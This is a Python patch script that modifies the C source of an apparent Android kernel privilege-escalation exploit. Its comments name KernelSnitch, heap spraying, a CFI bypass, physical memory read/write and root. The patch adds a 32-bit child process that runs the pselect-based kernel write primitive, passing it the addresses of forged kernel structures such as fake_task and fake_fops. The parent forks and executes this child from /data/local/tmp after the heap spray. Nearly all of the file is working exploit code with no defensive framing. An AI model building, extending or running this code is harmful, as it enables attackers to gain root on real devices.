#!/usr/bin/env python3
# Hybrid: 64-bit main keeps KernelSnitch/spray/CFI/physrw/root; only the pselect
# route runs in a 32-bit child (compat select, shift=6).
# Requires the route's kernel-address globals to be 64-bit so a 32-bit child can
# hold them.  The child gets `base` (+ target/value/mode) on argv.
import re

# ---- common.h ----
p = 'src/core/common.h'
s = open(p).read()
repl = {
 'extern uintptr_t page_base;': 'extern uint64_t page_base;',
 'extern uintptr_t last_mm_struct;': 'extern uint64_t last_mm_struct;',
 'extern uintptr_t fake_lock;': 'extern uint64_t fake_lock;',
 'extern uintptr_t fake_w0;': 'extern uint64_t fake_w0;',
 'extern uintptr_t fake_task;': 'extern uint64_t fake_task;',
 'extern uintptr_t fake_parent;': 'extern uint64_t fake_parent;',
 'extern uintptr_t fake_right;': 'extern uint64_t fake_right;',
 'extern uintptr_t fake_left;': 'extern uint64_t fake_left;',
 'extern uintptr_t fake_fops;': 'extern uint64_t fake_fops;',
 'extern uintptr_t binwrite_target;': 'extern uint64_t binwrite_target;',
 'extern uintptr_t pselect_custom_target;': 'extern uint64_t pselect_custom_target;',
 'extern uintptr_t pselect_custom_value;': 'extern uint64_t pselect_custom_value;',
 'void set_pselect_write_mode(uintptr_t target, uintptr_t value, int mode);':
   'void set_pselect_write_mode(uint64_t target, uint64_t value, int mode);\nextern int route_only_mode;',
}
for a, b in repl.items():
    assert s.count(a) == 1, ('common.h', a, s.count(a))
    s = s.replace(a, b, 1)
open(p, 'w').write(s)
print('common.h ok')

# ---- util.c ----
p = 'src/core/util.c'
s = open(p).read()
repl = {
 'uintptr_t page_base;': 'uint64_t page_base;',
 'uintptr_t last_mm_struct;': 'uint64_t last_mm_struct;',
 'uintptr_t fake_lock;': 'uint64_t fake_lock;',
 'uintptr_t fake_w0;': 'uint64_t fake_w0;',
 'uintptr_t fake_task;': 'uint64_t fake_task;',
 'uintptr_t fake_parent;': 'uint64_t fake_parent;',
 'uintptr_t fake_right;': 'uint64_t fake_right;',
 'uintptr_t fake_left;': 'uint64_t fake_left;',
 'uintptr_t fake_fops;': 'uint64_t fake_fops;',
 'uintptr_t binwrite_target;': 'uint64_t binwrite_target;',
 'uintptr_t pselect_custom_target;': 'uint64_t pselect_custom_target;',
 'uintptr_t pselect_custom_value;': 'uint64_t pselect_custom_value;',
 'void set_pselect_write_mode(uintptr_t target, uintptr_t value, int mode) {':
   'void set_pselect_write_mode(uint64_t target, uint64_t value, int mode) {',
}
for a, b in repl.items():
    assert s.count(a) == 1, ('util.c', a, s.count(a))
    s = s.replace(a, b, 1)
open(p, 'w').write(s)
print('util.c ok')

# ---- fops.c: skip CFI stage when running as the route-only child ----
p = 'src/core/fops.c'
s = open(p).read()
a = '''      if (pselect_custom_write_enabled()) {
        cfi_last_step = 0;
        cfi_last_errno = 0;
        route_verified = 1;
        if (active_offsets && active_offsets->off_system_unbound_wq &&
            !root_child_done) {'''
b = '''      if (pselect_custom_write_enabled()) {
        cfi_last_step = 0;
        cfi_last_errno = 0;
        route_verified = 1;
        if (route_only_mode) {
          /* 32-bit route child: the 64-bit parent runs try_cfi_stage() */
        } else if (active_offsets && active_offsets->off_system_unbound_wq &&
            !root_child_done) {'''
assert s.count(a) == 1, 'fops cfi guard'
s = s.replace(a, b, 1)

# also make the route's custom_target/value 64-bit where printed/used
s = s.replace('uintptr_t pselect_write_value(void) {', 'uint64_t pselect_write_value(void) {')
s = s.replace('uintptr_t pselect_write_target(void) {', 'uint64_t pselect_write_target(void) {')
open(p, 'w').write(s)
print('fops.c ok')

# ---- main.c: route_only_mode + --route child mode + parent exec ----
p = 'src/core/main.c'
s = open(p).read()
a = 'const struct kernel_offsets *active_offsets = NULL;'
assert s.count(a) == 1
s = s.replace(a, a + '\nint route_only_mode;', 1)

# add the route-only entry (before main)
a = 'int main(int argc, char **argv) {'
assert s.count(a) == 1
route_fn = '''static int run_route_only(int argc, char **argv) {
  setvbuf(stdout, NULL, _IONBF, 0);
  route_only_mode = 1;
  if (select_offsets() < 0) return 1;
  init_p0_profile();
  pin_to_core(CORE);
  uint64_t base = strtoull(argv[2], NULL, 0);
  uint64_t target = strtoull(argv[3], NULL, 0);
  uint64_t value = strtoull(argv[4], NULL, 0);
  int mode = atoi(argv[5]);
  page_base = base;
  fake_lock = base + (int64_t)(LOCK_OFF + SKB_DATA_DELTA);
  fake_w0 = base + (int64_t)(W0_OFF + SKB_DATA_DELTA);
  fake_task = base + (int64_t)(FAKE_TASK_OFF + SKB_DATA_DELTA);
  fake_fops = base + (int64_t)(FOPS_TABLE_OFF + SKB_DATA_DELTA);
  binwrite_target = base + (int64_t)(SCRATCH_OFF + SKB_DATA_DELTA);
  set_pselect_write_mode(target, value, mode);
  if (!pselect_custom_value) pselect_custom_value = fake_fops;
  pr_info("route child base=%016llx lock=%016llx w0=%016llx task=%016llx "
          "fops=%016llx target=%016llx mode=%d\\n",
          (unsigned long long)base, (unsigned long long)fake_lock,
          (unsigned long long)fake_w0, (unsigned long long)fake_task,
          (unsigned long long)fake_fops, (unsigned long long)target, mode);
  run_main_route_threads();
  return 0;
}

'''
s = s.replace(a, route_fn + a, 1)

a = '''    if (argc > 1 && strcmp(argv[1], "--write1") == 0)
        return run_write1_only();'''
assert s.count(a) == 1
s = s.replace(a, a + '\n    if (argc > 5 && strcmp(argv[1], "--route") == 0)\n        return run_route_only(argc, argv);', 1)

# parent exec of the 32-bit route child (only in the 64-bit build)
a = '''  TIMER("  heap spray done");
  run_main_route_threads();
  TIMER("  PI route done");'''
assert s.count(a) == 1
new = '''  TIMER("  heap spray done");
#ifndef COMPAT32
  {
    char b[32], t[32], v[32], m[8];
    snprintf(b, sizeof b, "%llx", (unsigned long long)page_base);
    snprintf(t, sizeof t, "%llx", (unsigned long long)pselect_custom_target);
    snprintf(v, sizeof v, "%llx", (unsigned long long)pselect_custom_value);
    snprintf(m, sizeof m, "%d", mode);
    pid_t rc = fork();
    if (rc == 0) {
      execl("/data/local/tmp/ghostlock32", "ghostlock32", "--route",
            b, t, v, m, (char *)NULL);
      pr_error("exec route child failed errno=%d\\n", errno);
      _exit(127);
    }
    if (rc > 0) {
      int rst = 0;
      waitpid(rc, &rst, 0);
      pr_info("route child exit status=%d\\n", rst);
    }
  }
#else
  run_main_route_threads();
#endif
  TIMER("  PI route done");'''
s = s.replace(a, new, 1)
open(p, 'w').write(s)
print('main.c ok')
